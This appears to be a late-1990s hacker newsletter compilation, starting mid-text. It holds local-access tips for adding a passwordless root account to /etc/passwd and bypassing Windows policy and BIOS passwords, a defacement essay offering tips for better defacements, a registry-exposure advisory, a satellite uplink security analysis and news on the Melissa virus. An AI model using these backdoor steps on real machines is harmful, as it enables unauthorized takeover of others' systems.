       cat >> /etc/passwd 
       manicx::0:0:new root account:/root:/bin/bash
       (hit crtl+d to get out of cat)
       
       sync (just to bring your files up to date)
       
       reboot and login with your new root account called manicx (no password)
       
       
       
       System: Linux  (with local access)
       
       Gives a root shell / root account
       Boot with the rescue.img available on most linux distro cd's
       voila one root shell you will probably have to mount your linux
       partition (hda5 is the partition might be hda2 > hda7)
       
       mkdir /linux
       mount /dev/hda5 /linux
       cat >> /linux/etc/passwd
       manicx::0:0:new root account:/root:/bin/bash
       (hit crtl+d to get out of cat)
       
       sync (just to bring your files up to date)
       
       reboot and login with your new root account called manicx (no password)
       
       
       
       System: Windows
       
       Remove All policy restrictions
       
       Open regedit
       Scroll down to :
       HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\policies
       
       Anything with a value of "1" is turned ON so double click on it
       and change the value to "0" to turn it OFF
       (Or if you cant be arsed just delete them, Its best to 
        note changes and change them back when your finished)
       
       When your finished just exit you should now have access to the 
       all the restricted commands (run/dosprompt/control_panel/etc)
       
       (Win98- You will probably have to reboot before the changes take effect)
       
       
       
       System: Windows 95
       
       Close down the start menu :þ
       Double click the [Start] button, so its got a black dotted line
       on it (this means its got focus) hit alt and - (minus key)  at the 
       same time, voila you can now move or close the startmenu 
       
       
       
       System: Windows
       
       Gets rid of BIOS password (and resets CMOS settings)
       killcmos.zip
       Or Pull out the cmos battery for 5-10 mins (you need to know the setup)
       
       
       
       System: Windows
       
       Get past any password protection before boot-up
       Try booting from a floppy or holding down the shift key during startup

       Subject: Index Server 2.0 and the Registry
       
       
       When Microsoft's Index Server 2.0 is installed on NT 4 with 
       Internet Information Server 4 it opens a new "AllowedPath" 
       into the Windows NT Registry.
       
       Administrators can control who can access the Windows NT 
       Registry via the network by editing permissions on the 
       Winreg key found under
       
       HKLM\SYSTEM\CurrentControlSet\Control\SecurePipeServers\Winreg
       
       By default, on NT Server 4, the permissions on this key are 
       set to Administrators with Full Control. No-one else should 
       have access (although it doesn't really work out like this in 
       the end.) There are certain paths through the Registry that 
       remote users, whether they are Administrators are not, may 
       access. These are listed in the AllowedPaths subkey found 
       under the Winreg key. These paths are to allow basic network 
       operations such as printing etc to continue as normal.
       
       Index Server 2.0 creates a new "AllowedPath":
       
       HKLM\System\CurrentControlset\Control\ContentIndex\Catalogs
       
       meaning that anyone with an local or domain account for that 
       machine, including Guests, are able to discover the physical 
       path to directories being indexed or if a directory found in a 
       network share is being index they can learn the name of the 
       machine on which the share resides and the name of the user 
       account used to access that share on behalf of Index and 
       Internet Information Server. Permissions on the above key and 
       its sub-key give Everyone read access.
       
       Note that regedit and regedt32 can not be used to access this 
       information. Tools such as reg.exe or home-baked efforts must 
       be used.
       
       In most cases this issue represents a mild risk, but one worth 
       noting and resolving by removing if this adversely affects you
       and your security policy.

      The Good, The Bad, and The
      Impressive.



      Introduction

      Browsing the web, enjoying your time, nothing better to do. Casual search
      for something interesting to read, or maybe even a little research for a
      project or term paper.  Click here, click there, link from site to site.
      Some mostly worthless, nothing more than links to other pages.  Same old
      thing, different day.. until today. You typed in the URL for a web page
      that promised to have your info.  Instead of computer pricing or biology,
      you found a cryptic message scrawled out claiming something, hell if you
      could tell what it was. You click on and forget about it. 

      Yes, that was a hacked web page. One of the favored things of crackers to
      boast their deeds. Proof that they alone control the universe and 'own'
      someone else's computers.  Self reasoning and a shoddy moral vindication
      of a petty break-in to some no name computer. At least, that sums up
      almost 99% of current web defacement activities. Why? 



      The Ends Justify The Means.

      Ok, lets buy that argument for now. The 'means' in our case is the hacking
      of a site and the 'ends' constitutes replacement of the existing web page
      with a new 'improved' page carrying the hacker's message. In today's
      digital world, it is the equivalent of spray painting a wall to have your
      message seen by passerbys. Stop here and think about all of the spraypaint
      graffiti you have seen in the last six months. How much can you remember?
      Odd isn't it. Some person took the time and effort to break the law in
      order to get their message out. Risk possible incarceration for words or
      ideas they felt were important, yet you can't remember any (or all)  of
      it. Why? 

      Simple answer. Because there was no real message worth reading.  After
      taking the power of free speech into their hands, after finding a place to
      stand on a soapbox, the person stood up only to mumble to a handful of
      faithful followers that already know the message. And boy, do they love to
      hear you talk! The rest of the passerby's continue on, unconcerned. They
      still don't know what you are trying to say. In fact, their opinion of you
      has gone down because you took the time to get a soapbox, stand on it, and
      face the public. You flaked out and didn't broadcast a meaningful message,
      therefore you are worth no time or thought. And there you go, a passing
      inattention in a fast moving world. Congrats. 



      My Rant in Plain English

      In the past few years, over one thousand web pages have been hacked. 
      Their content has been replaced with whatever hasty rant has popped into
      mind by the cracker. With few exceptions, arbitrary low traffic and no
      name domains are 'chosen' by these crackers to put up their message. Some
      of these sites get more traffic from the hack than a previous month of
      regular visitors they are so low key. 

      The truth is, these kids(1) have delusions of grandeur in a networked
      world that could give a second thought about them. Their message is
      meaningless drivel that only impresses other kids for the most part. Web
      viewers walk away from seeing their "message" thinking immature social
      rejects plague the net, and they think so for damn good reasons. 

      More and more sites are being replaced by poorly designed pages, chock
      full of mispelled words forming sentences that defy all rules of grammar.
      Pages full of "elite speak"(2) that prove absolutely nothing, have no
      humor value, and only contribute to more eye strain.  Pages containing
      poorly written rants that form incoherent thoughts, opinions or reasons as
      to why the page was altered in the first place. Basically, dull pages that
      show a complete lack of intelligence and no creativity whatsoever. 

      These kids have a chance to show the world that they are indeed
      intelligent well balanced *mature* net users, yet they throw every chance
      away it seems. 

      (1) I use the word kids because more times than not, they ARE
          kids. Fifteen to Eighteen year olds that don't quite have
          a concept of how things work. In the cases where they are
          over eighteen, it is often difficult to tell based on the
          content of the altered pages. Don't like the use of the
          word 'kid'? Do a better job hacking these pages.
      (2) Elite speak being the oh-so-old replacement of alternate
          characters to spell words. t|-|1s TyP3 0f +3xt.



      Justification

      It seems most hackers want/need to justify their actions, be it to the
      admin of the site they broke into, the people reading the pages, their
      friends or often times themselves. Regardless of who they are trying to
      vindicate themselves to, the reasoning falls apart every time. 

      Justification #1: "I'm doing you a favor.. this could have been a
      malicious hacker that damaged your system!". Gee thanks for breaking in to
      tell me that. It didn't occur to you that the other 80 MILLION internet
      users did me a favor by not breaking in? Yet I should thank you? Although
      these kids rarely do damage, they cause the administrator extra grief in
      one form or another. Rather than normal work, they are forced into doing a
      full security audit of their system or reinstalling from scratch. Yes,
      maybe they should have been more concerned with security before this, but
      it is a rare site that can dedicate that kind of time or resource to
      staying up to date on the bleeding edge.  That is the way the world works,
      so deal with it. Oh, and don't try to use that as a justification. 

      Justification #2: "Because we can!" Ok, so if I shoot you in the
      knee 'just because I can', does that teach you any real lesson? Amazingly
      enough, this is about the only justification that holds any water.  If
      nothing else, it is the brutally honest truth that the person had nothing
      better to do, and had no well grounded reason for their actions. Instead
      of using this as a justification, why not think of a truly noble cause and
      follow it? 

      Justification #3: "I was pointing out security holes on your site!" 
      Gee, thanks for the free security audit. Not. While you did indeed prove
      there was a hole, did you mail the administrator telling him HOW you broke
      in? How to fix it? Did you find more than one way into the system or just
      the one? If you did none of that, you weren't even close to performing a
      security audit. Oh, audits require permission too. Bad reason. 

      Justification #4: "Read my political reasons yo!" This one almost
      works for me, but like the others has serious shortcomings. If your true
      reason is to impress upon your readers of some political or moral agenda,
      did you really do it? A good job of it? Did you sit down and research your
      topic, finding resources and legitimate sources of information to leak to?
      Did you write up a political rant and place it on an appropriate system?
      Did you spell check your work to make sure that it flowed reasonably well?
      Doubtful. Putting up third grade level rants on www.unrelated.com mean
      just about nothing and truly fail as a justification. Try again. 



      Suggestions For Improving Your Hacked Pages.

      I am not one to complain about a problem without offering some solution or
      input to offset the bitching. However, with this comes the chance people
      will blame me for encouraging hacking and continued defacement of web
      pages. I do NOT condone any such thing! I am practical and realize
      that nothing I say will stop people from doing it. That in mind, I am just
      trying to make the best out of an existing situation. That said... here
      are my top 10 suggestions for future hacked pages.

      1.      Better designed pages! Hackers and crackers are said to be
              creative. You sure wouldn't know it looking at many of these
              pages. Take your time and DESIGN the web page you are putting
              up. Make it aesthetically appealing to both lynx and graphical
              browsers. Why do companies spend all the time on beautiful
              pages in the first place?

      2.      Better messages! You are cracking these machines and
              replacing pages to "get your message out". Err, ok, what is your
              message? Remember that people are visiting with no prior
              knowledge of you, your message, or your cause. Be clear and
              concise and spell out your message for them.

      3.      No more elite speak crap. If you want to impress people
              with alternate characters, offer the hacked page in several
              languages. I for one would love to know what some of the hacked
              pages in Mexico say, and I would also bet that foreign hackers
              would love to read American hacks in their tongue. Surely you know
              someone who can translate to German, French, Latin, Russian
              or more impressive, Japanese. :)

      4.      You want to use 'elite' speak? Try grammar, spelling, and
              puncuation. A well written paragraph will command more respect
       than any substitute character will. If you mispell common
       words, how can anyone take you serious? Do you find yourself
       falling behind in English classes? Use the net to help you!
       You may find online resources like a dictionary or thesauras
       an invaluable tool.
       
       5.      Help the site! After all, you embarassed them and caused
       them some kind of hassle. After breaking in and changing their web
       page, why not temporarily patch the hole/bug in the system
       that gave you access? Better, patch it and tell what you exploited
       to get in on the web page. Let other admins learn that these
       holes are actively being exploited. Link to information on more
       permanent solutions to their security problem. That is at least
       half way noble.
       
       6.      Back up the main page for them! Rather than overwriting
       their index.html and relying on them to have a copy, just rename
       the old one. From your new page, link to the old one and give
       customers a chance to reach the information they were looking
       for. They had to read your message to get to it, your job is
       done.
       
       7.      Show knowledge of computers! Creating your hacked web pages
       with editors like 'FrontPage Express' isn't exactly condusive
       to propagating the myth that hackers know the system. If you
       can't write out a basic web page in a simple editor like 'vi',
       'pico', or 'DOS edit', you should probably learn HTML before
       worrying about other people's systems.
       
       8.      Target your hacks! Don't change the page of any arbitrary
       domain you happen to stumble across. Pick a system you feel
       that needs a face lift and apply it to that system only.
       
       9.      Don't actually carry out the mass hack! If you find
       yours in the position of being able to change pages on multiple
       domains, don't. Just pick the highest traffic domain, or biggest
       name and change that one. On your hacked page link to a list of
       other domains that could have been affected.
       
       10.     Choosing a name! Try to be mature when choosing a name.
       Everyone realizes that some names are quite humorous, but remember
       who reads these pages. Making a profound statement and backing
       it by "tHe SiNgAlOnG gAnG!@$#$@" just isn't very cool.
       
       
       
       The Good, The Bad, and The Impressive.
       
       The good, the bad, and the impressive.
       
       In the past, there have been pages (more like *elements* of pages)  that
       have stood out as creative, amusing, or to the point. Hopefully by
       pointing out these examples you will begin to see what I have been
       attempting to convey. 
       
       The Good
       
       Humor: While it probably wasn't the best site to hit, the recent
       hack of Greenpeace
       had a certain dark (and sick) sense of humor behind it.
       
       Interesting: Another new person/group to hit the scene recently is
       'Redemption'. Their hacks to date have simply contained
       (apparent) original poetry. A sign of creativity at last!
       You can read their work from hacks like DaytonTech, 
       Town Green, and TC Edge.
       
       Targeted: As suggested above, targeting specific domains in order to
       spread a specific message is a good thing. Examples of this
       can be found in 
       Monica Lewinksy's 
      Future Site, White Pride, and Ku Klux Klan.

      Political: Probably the most memorable and well done hacks was that of
                 the 'Human Rights China' site. When hacking for political 
                 agendas, hit the right site, with the right message, and
                 present a well written argument. Does wonders. Don't believe
                 me? Check out the www.humanrights-china.org
      hack.

      The Bad

      Bad:      Amnesty International found themselves victim of a web
                page defacement. Of all the sites on the net, why hit
                groups that are trying to do good already? Isn't that
                somewhat defeating?

      Pathetic: The various hacks for a short period of time carried out
                by 'zyklon' of LoU. These hacks (many movie home pages)
                turned out to be one or two lines of broken english followed
                by a dedication to his girlfriend. *yawn* Kiddies with
                no creativity.

      Pathetic: The recent mass hack by the 'Miss Piggy Hackclub', which
                caused over one hundred domains to display a single line:
                "The Miss Piggy Hackclub Strikes again muthafuqErz!$##$!@"
                *yawn* That is almost worth reading.

      The Impressive

      None! There hasn't been a truly impressive web page defacement to come
      along. None that took the cake in site, message, and design. :(

      Security Analysis of Satellite
      Command and Control Uplinks

      By Brian Oblivion, L0pht Heavy Industries 
      mailto:oblivion@l0pht.com



      With every passing day we are becoming aware of the
      fragile link between technology and modern society. Many
      critical information paths flow over satellites orbiting our
      earth. A box floating in space seems to be a likely target
      for hacker groups or renegade nation-states. As
      sensational as such a satellite takeover would be, it is
      highly unlikely. These satellites cost millions of dollars, and
      an adequate sum of money is devoted to make sure it
      remains under the control of the intended parties. 

      This document attempts to perform an analysis of security
      methods used by Government/Military Ground Stations.
      This information is a summation and review of open-source
      non-classified information taken from the Internet and
      other printed sources. Most information is from NASA
      operations proceedures, however, references from those
      proceedures influence/are influenced by military SATCOM
      standard operating proceedures. 

      There are two methods of compromising a satellite by an
      external threat vector.* One is an attack directly on the
      Satellite by a rogue Ground Station. The second is an
      attack on the Master Ground Station (MGS), which houses
      the command and control (C&C) Uplink, and various
      access control equipment. An outside attacker may not
      have all the resourses necessary to attack the C&C uplink
      such as the eqiupment that encodes the commands and
      the transmission to the spacecraft. This driving factor
      makes the assult on the MGS all the more appealing. 

      A great deal of work has been put into securing the C&C
      Uplink. The spacecraft command processor authenticates
      every command sent to it. The C&C data is often
      encrypted and decrypted in the spacecraft. The downlink
      is often unencrypted, however, in the military arena, this
      is often encrypted as well. Various transmission modes
      can be used but in the military/government arena spread
      spectrum (SS) or frequency hopping (FH) is generally
      employed using secure spreading or hopping sequences.
      SS and FH are used due to thier anti-jamming and low
      probability of intercept characteristics. 

      In the unlikely event a rogue Ground Station actually
      acquired the sequence to get a command burst to the
      satellite, the MGS would begin to receive telemetry
      indicating that a command channel is being accessed.
      Responses from the satellite to the rogue Ground Station
      would be received at both locations. The MGS would see a
      response to a request it did not send and a flag would be
      raised at which point contingency plans would be set in
      motion. It would also be very difficult for a rogue Ground
      Station to supply the proper command sequence field,
      unless the MGS is being monitored. Highly unlikely in the
      case of the armchair hacker, point and clicking his way to
      telecommunications Godhood. 

      By far the path of least resistance is obtaining control
      through compromising the security of the MGS. While long
      term control may not be achievable, there is the
      possibility of spoofing a command message to the uplink
      operators and having them pass that information to the
      satellite. Scientific Exploration and commercial satellites
      usually conform to the CCSDS telecommand frames and
      the military/government uses something similar.
      Information on these command frames and command
      syntax are available through the Internet. 

      A set of checks and balances exist within the MGS. If a
      command request exceeds pre-defined parameters, the
      command is flagged and escalated to an authority to
      determine the nature of the exception. Interception,
      modification, and re-submission of a command message is
      of the greatest risk. However, the attacker would require
      an indepth knowledge of the target system and have
      knowledge of the normal operational parameters so
      exceptions would not be flagged, reveling his presence.
      Once a command is determined valid by the spacecraft
      command processor, the command is sent back to verify
      the proper command was indeed received and awaits
      acknoledgement. Further analysis of the command
      processor and actual checks performed on the sequence
      and syntax of commands received are beyond the scope
      of this document. 

      Due to these checks, one command sending the satellite
      spiraling out of orbit is just not possible without the
      addition of catestrophic equipment failure. Remember that
      satellite position is also tracked by third parties. In the
      event that a satellite makes a change in course, the MGS
      of that satellite would be immediately notified. There are
      other checks in place that monitor the heartbeat of a
      satellite. Should that satellite move, its associated beam
      spot would become disturbed resulting in loss or
      degredation of communications. 

      There are overrides to the normal safeguards for
      emergency spacecraft commanding. As long as an override
      provision exists, there is the possibility of the exploitation
      of that provision. However, the override can only be
      engaged by onsite MGS personel. Manual overrides are a
      requirement for every MGS. In the event that the
      computerized frontend is compromised in some fashion, be
      it of malicious intent or equipment failure, commands can
      be relayed to the spacecraft directly from manual
      command consoles. 

      The nature of Satellite communications often dictates
      that Ground Stations are not necessarily located in the
      most convient locations. Quite often they are located in
      remote regions and/or at sea. This requires a distributed
      networking architecture as well as interoper- ability
      definitions. NASA in particular has been moving from its
      highly proprietary legacy systems to more
      commercial-off-the shelf (COTS) hardware. One must
      realize this obscurity once provided additional security to
      the network. The current trend in commercial security
      offerings is a reactionary role to security management.
      Holes remain to be identified until the units are shipped to
      the end user and often not found until the device is in
      operation. 

      Some MGS's are known to be connected to live
      internetworked nets. These nets are often treated as
      sensitive, yet unclasified, to support interoperability.
      Security policy governing the nature of the systems which
      are hosted by the satellites define the security of the
      MGS network. Where interoperablity is not an issue,
      without physical access to the MGS, your chances are
      remote to compromise the system. 

      Institutional security policy sets directives in employing
      firewalls and restrictive routers. Intrusion detection
      system may also be employed between closed networks.
      SecurID, kerberos, and biometric access controls are
      found throughout the commercial/government/military
      access controls. Access is usually restricted by IP
      address. Firewalls and routers have been known to be
      accidentially misconfigured, and often remain that way for
      lenghty periods of time due to inadequate penetration
      testing and security fault analysis. An offline
      proof-of-concept security prototyping lab is a requirement
      for integrating a new access control system into the
      operational environment. A good institutional security
      policy will require such facilities. 

      Many safeguards have been built into the existing C&C
      uplinks. Key management systems are classified, as is
      information on implementation of cryptographic systems
      used. There may be holes in the implementation, but with
      the other safeguards, the chances of successfuly
      undermining the o security mechanisms is slim. One can
      never under estimate the human factor in these systems.
      To poke holes in security policy is human. 

      Hopefully this article shed light onto the criteria which
      may lead to MGS compromise and direct satellite C&C
      uplink attack. The chances of something along these lines
      actually happening without new techniques or heretofore
      unknown methods being employed, is remote, but not
      impossible. 

      ---------------------------------------------------- 

      * A third attack vector could be an attack from within.
      Poisoning the flight software on the satellite, or the
      software used to interact with the satellite, bypassing
      required security provisions. 

      Code review could diminish this threat.

       morning to overloaded email servers as a new MS Word
       Macro Virus/Worm spreads across the internet. "Melissa"
       attacks users of MS Outlook by grabbing up to fifty
       addresses from an Outlook address book and
       automatically sends copies of itself as an MS Word
       attachment to unsuspecting victims. While the
       virus/worm does not seem to intentionally cause
       damage the flood of email that it generates is enough to
       bog down servers essentially causing a major denial of
       service. Users who do not use Microsoft products will
       not be effected.

      Porn virus hits
      Corporate America 

      By Adam L. Penenberg with Elizabeth Corcoran 

           number of companies--including Microsoft,
          Compaq, Intel and Boeing--have been infected by
          a new computer virus that attacks users of the
          Microsoft Outlook E-mail program. The virus,
      dubbed "Melissa," was first cataloged today, March 26,
      by MacAfee on its web site. 

      The virus is spreading rapidly and, because of its design
      is jamming E-mail gateways and causing system
      administrators to shut down. Since the virus was
      uncorked just before the weekend, when IT staff are
      away from work, the full extent of the damage may not
      be known for some time, although it is certain that
      many more companies--and individuals--will fall victim. 

      If you are listed in someone's Outlook Express address
      book, and he is infected, then you could be affected--if
      you open the attached MSWord file. 

      "Getting rid of this will take a long time, because it only
      takes one message to start it all over again," says Barry
      Wadman, president of C-Systems, an E-commerce
      designer. "I venture to say that this will be affecting
      and or infecting the net for at least a couple of weeks."

      Intel, according to PR manager Tom Waldrop, has
      ordered those who have received the virus to shut
      down their machines. "The IT staff is working hard to
      make sure that infected machines are cleaned
      appropriately," he says. 


              "It is certain that many more
              companies will fall victim." 



      Melissa is a Word Macro Virus that is spread when a
      user opens an attached Microsoft Word file. Upon
      activation, it looks for Outlook--Microsoft's E-mail,
      newsreader and personal information manager--creates
      a message, and sends it to the first 50 people listed in
      the user's address book. Each message contains the
      subject: "Important Message From (Your User Name)."
      The body of the E-mail simply says, "Here is that
      document you asked for ... don't show anyone else ;-)" 

      When users click on the attached file, they unleash the
      virus. The attached file contains a list of 300 porno
      sites--passed on as if the sender is pointing people to
      XXX porno sites. It also modifies the normal template in
      MS Word, infecting every new document that the user
      creates with Word. 

      The virus is not malevolent, meaning it does not destroy
      or alter data, or trash hard drives. But it is fiendish
      because of the intense volume of E-mail it produces,
      which is causing networks to choke. Only users of
      Microsoft Outlook are affected by the Melissa virus.
      Macintosh users and those using other E-mail programs
      have nothing to worry about. 

      "In the past people have always been told not to open
      attachments that come from people you do not know,"
      says Space Rogue, publisher of Hacker News Network
      and a member of L0pht Heavy Industries, a
      Boston-based hacker think tank. "Well, here is a virus
      that is sent as an attachment from someone you do
      know." 

      The Melissa virus seems to be one of the few with a
      utiltarian purpose. Since the virus spreads so quickly, it
      "would definitely be a great spam vehicle," says Dildog,
      another member of Lopht. 

      Most spam points recipients at porn sites and
      get-rich-quick scams. That typical spam is easily traced
      back to its source, since the spammer usually includes a
      web site, phone number or E-mail address. But the
      Melissa virus, by automatically spewing out a list of 300
      sites, makes tracing the creator extremely difficult. 

      Comments inside the virus include: 

      'WORD/Melissa written by Kwyjibo

      'Works in both Word 2000 and Word 97

      'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!

      'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!

      The best way to stop the virus? Be suspicious of mail
      with attachments and the subject line: "Important
      Message From (Your User Name)"

       'Melissa' virus hits Internet 
       
       Copyright © 1999 Nando Media

       By DICK SATRAN 
       
       SAN FRANCISCO (March 28, 1999 4:34 p.m. EST http://www.nandotimes.com) 
       - A virus that spreads via e-mail hit computers over the weekend and
       threatened havoc Monday as workers return to offices and begin opening
       messages sent over the Internet. 
       
       The virus, called "Melissa," comes in the form of a document that lists
       pornography sites on the World Wide Web. 
       
       Computer experts said the virus was aimed at widely used Microsoft 
       Windows-based e-mail address book software, Outlook and Outlook
       Express, and it can send up to 50 additional versions of the e-mail to
       other users, threatening a widespread infection of computer systems. 
       
       That could create a flood of unwanted e-mails around the Internet as the
       program perpetuates itself using pre-programmed "macros," software
       embedded in the Windows operating system that sets off complex computer
       functions with one command. 
       
       "It could grow explosively and shut down e-mail systems as a side effect," 
       Eric Allman, co-founder of the Emeryville, Calif.-based Sendmail, a
       widely used provider of e-mail services, said in an interview Sunday. 
       
       A number of leading software security firms and academic experts posted 
       warnings about the e-mail threat, including Network Associates, the
       leading anti-virus software maker. 
       
       "Melissa is widely reported and spreading quickly via mass e-mail, a 
       function of the viral infection," said Network Associates based in Santa
       Clara, Calif. 
       
       Carnegie Mellon University's Software Engineering Institute issued an 
       advisory, which said, "The number and variety of reports we have received
       indicate that this is a widespread attack affecting a variety of sites." 
       
       The only damage the virus causes is that it replicates itself and creates
       a flood of e-mail, though it apparently does not hurt the computer itself,
       experts said. 
       
       The real danger is that the virus will overwhelm the server computers that
       handle computer messaging systems, which could lead to system shutdowns as
       each e-mail multiplies itself 50 times. Already, a wave of the e-mails has
       been sent out and awaits office workers Monday morning. 
       
       "It's not doing malicious things or removing files or anything like that," 
       Allman said. "I've heard claims that it has been doing more but I haven't
       seen any substantial verification of that. It's really more of a wake-up call,
       that shows us how you could take a malicious virulent virus and
       reproduce it all over the place very quickly." 
       
       Computer experts warned users to be wary of documents sent from any senders 
       asking them to open up a file for Microsoft Word. That file, in turn, asks for
       a prompt asking users whether they want to initiate a "macro," and requires 
       users to approve its use. Those checkoffs make it
       relatively easy to avoid the problem. 
       
       Microsoft itself has simply warned users to "be careful about what runs on their
       machine," the New York Times reported. Carnegie Mellon said,
       "our analysis indicates that human action (in the form of a user opening an 
       infected Word document) is required for this virus to activate." 
       
       The virus can be identified, Network Associates said, because it will read 
       "Important Message From Application.UserName." The body of the text reads "Here 
       is that document you asked for ... don't show anyone else" and contains a list of
       pornographic Web sites. 
       
       Melissa creates the following entry in the registry: 
                             HKEYCURRENTUSER/Software/Microsoft/Office/"Melissa?" 
       
       Network Security said that to avoid the risk of contracting the Melissa virus, 
       "it is recommended that network administrators and users upgrade their anti-virus
       software to include detection and cleaning for W97M/Melissa." 
       
       Network Security posted information about the virus on its the Web site of its 
       Avert Labs division, Sendmail also posted advice on the Melissa problem at 
       http:/www.sendmail.com and Carnegie Mellon posted information on its Web site as
       well. 
       
       Computer experts said that if advisories were followed, the problem would probably
       not become a widespread worry. 
       
       "I suspect we'll see a day or two of extremely high e-mail loads and then it will 
       just die out, so in some sense this virus is not that critical but it's  one what
       demonstrates what could happen if a truly malicious virus were released," Sendmail's 
       Allman said. "The ability to spread something so
       broadly is scary." 
       


        FBI, experts search for elusive author of 'Melissa' virus 

        March 30, 1999
        Web posted at: 10:47 p.m. EST (0347 GMT)
        http://www.cnn.com/TECH/computing/9903/30/virus.tracker/index.html
        

       WASHINGTON (CNN) -- Several mutations of the computer virus
       known as Melissa surfaced Tuesday, although experts said they were not as
       effective as the original in clogging e-mail systems. 

       The FBI has launched an investigation into the fast-spreading virus, which
       first appeared last Friday and spread rapidly around the world by Monday. 

       The agency estimated that the virus has affected "thousands of computer
       users" at more than 100 companies and government agencies. 

       "I urge e-mail users to exercise caution when reading their e-mail for the next
       few days and to bring unusual messages to the attention of their system
       administrator," said Michael A, Vatis, director of the FBI's National
       Infrastructure Protection Center (NIPC). 

       NIPC is a multiagency unit focusing on threats to the nation's infrastructure,
       including computers and telephone, electric and water systems. 

       The Melissa virus spreads via Microsoft's widely used Word 97 and Word
       2000 documents which can be attached to e-mail messages. 

       The Melissa virus comes in the form of e-mail, usually containing the subject
       line "Important Message." It appears to be from a friend or colleague. 

       The body of the e-mail message says, "Here is that document you asked for
       ... don't show it to anyone else" with a winking smiley face formed by the
       punctuation marks ;-). 

       Attached to the message is a Microsoft's Word document file that lists
       Internet pornography sites. Once the user opens that file, the virus digs into
       the user's Microsoft's Outlook address book and sends infected documents
       to the first 50 addresses. 

       Computer sleuth tracks down virus source

       As the virus swamped one computer system after another over the
       weekend, software developer Richard Smith followed a trail of electronic
       fingerprints left by Melissa. 

       "This electronic fingerprint is basically the serial number of your computer.
       So what I was curious about is whether it would be possible to use the serial
       number in the Melissa document ... to track down the author," said Smith,
       who runs Phar Lap Software, a small Cambridge, Massachusetts, software
       firm that makes operating systems and software tools. 

       Smith posted his "digital fingerprinting" theory on an Internet discussion
       group Friday. He received an e-mail from a college student in Sweden who
       pointed out similarities between Melissa and older viruses written by a
       computer user known as "VicodinES." 

       Smith was familiar with other work attributed to the notorious VicodinES,
       named after the painkiller drug Vicoden. The same user had posted
       so-called "virus creation tool kits" on the Web. 

       "In about 30 percent of those files, I found that same fingerprint number, the
       same serial number that was in the Melissa virus ... at a minimum, we know
       that the Melissa virus and these tool kits were created on the same
       computer," Smith said. 

       Threat remains

       Smith said he turned his findings over to the FBI, who regard the
       transmission of the virus as a criminal matter. 

       But the biggest impact of the Melissa virus appeared to be the temporary
       shutdown of massive computer systems by cautious managers. 

       Computer giants Microsoft and Intel were among those who received copies
       of the tainted note, as did Lucent Technologies, the world's largest
       communications equipment maker. 

       And although anti-virus software programs have so far been successful in
       containing Melissa, experts fear its variants will be corrected and distributed
       by copycat virus writers. 

       Indeed, a potentially more damaging virus code-named "Papa" emerged on
       Monday. The new virus is a more elaborate program that uses the same
       e-mail system as Melissa. 

         Correspondent Marsha Walton, The Associated Press and Reuters contributed to this
                                  report.

       I normally don't allow virus posts through the list as they seldom represent
       a new threat, just a new example of an already existing one, but this one
       is getting enough play to warrant a message.
       
       There is a new Word macro virus circulating called Melissa. The virus
       propagates via email. Attached to the email is a Word file that when
       opened will launch a macro that will send the same message to the first
       50 recipients of your Outlook address book. The subject line is
       "important Message From <some user name>". The body consist of the text
       "Here is that document you asked for... don't show anyone else;-)".
       The infected documents contains passwords to porn web sites.

       should have no problem obtaining copies to analyze. If anyone wants a copy

 12.2  PAPA, a new Melissa variant targets specific individual sites with ping flood attacks

      New Virus Launches Mini Infowar

      By Brian McWilliams
      InternetNews.com Correspondent 
                                                                                      Business News Archives 


      A new macro virus based on the infamous Melissa has been released into the wild, and it may be the latest phase in an infowar
      between hackers and a security consultant. 

      According to virus experts, the so-called Papa virus is transmitted in the same manner as Melissa, sending copies of itself to
      addresses in a victim's Microsoft Outlook address book. 

      But while Melissa seemed designed to snarl up computer networks everywhere, Papa targets a specific person, Fred Cohen, a
      security consultant in Livermore, Calif. 

      The virus, which is transmitted by e-mail in a Microsoft Excel file named path.xls, attempts to launch a ping flood on Cohen's web
      site at all.net, as well as on the IP address of Cohen's connection to the @Home Network cable Internet access service. 

      Cohen was among the first in the security community to publicize information about Caligula, a macro virus capable of stealing a
      victim's PGP private keyring. PGP is a popular encryption software package. 

      In a posting to a security mailing list last month, Cohen called on the Internet community to attack the web site of the Codebreakers,
      a virus writer's group to which Caligula's author belongs. 

      Cohen Tuesday confirmed the Papa virus is some sort of retaliation for his actions. But Cohen said there's been collateral damage to
      innocent Internet users, including severe performance degradation to the @Home Network. 

      "It's not an eye for an eye. They're causing damage to the infrastructure and inconvenience to people who get the virus. If they
      pester me, I don't care and nobody else cares. But if they take down the infrastructure, they'll go to jail." 

      @Home Network representatives were not available to confirm whether the attack on Cohen's IP address has impacted
      performance of the network. 

      Many antivirus software vendors have already released updates to detect and clean Papa. Keith Peer, president of Central
      Command, distributor of AntiViral ToolKit Pro said Papa is already spreading fast. His firm is receiving dozens of reports every
      hour.

 12.2  PAPA B and MadCow Joke virii variants already becoming widespread
       as copycats modify the Melissa code
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       Yet another variant of the nasty Melissa virus has surfaced on the Internet,
       this one with the subject line "Mad cow joke."

       <a href="http://www.zdnet.com/zdnn/special/melissavirus.html">Story</a>


       The new mad cow joke virus is unrelated to other so-called Mad Cow viruses 
       that have surfaced in the past, according to anti-virus company Trend Micro 
       Inc. The new virus is similar to Melissa in that it surfaces when users open
       a Word document attached to an e-mail, triggering e-mail to the top entries in
       an Outlook user's address book.

       Unlike Melissa, which sends out 50 messages, this one sends out only 20. Also, 
       it is a member of a group of viruses known as "class viruses," which store code
       in a different -- and harder-to-detect -- portion of a Word document.

       'I think it's going to show up affecting people,'
                       -- Dan Schrader, Trend Micro

 
       The virus comes with a subject line "Mad cow joke," a body containing the words
       "beware of the speed of the Mad cow," and an attached file called madcow.doc.

       The virus' creator even tipped his or her hat to Melissa. The last lines of
       code in the Mad cow virus read: "word/veronicathankstoword/melissaandword/class."


       Trend Micro hasn't heard from anybody who's seen the virus in action, but 
       officials there believe they will shortly. "I think it's going to show up affecting 
       people," said Dan Schrader, Trend Micro's product manager.


       More variations coming

       Schrader believes a host of variant viruses will surface in the wake of Melissa.
       "We're going to see a lot of them," Schrader said. "It's unfortunate these guys
        need to copycat."

       Most anti-virus firms have updated their software to ward off variants.

       "When viruses become popular, other hackers use them as a roadmap," said, Sal 
       Viveros, group marketing manager for Network Associate Inc.'s 
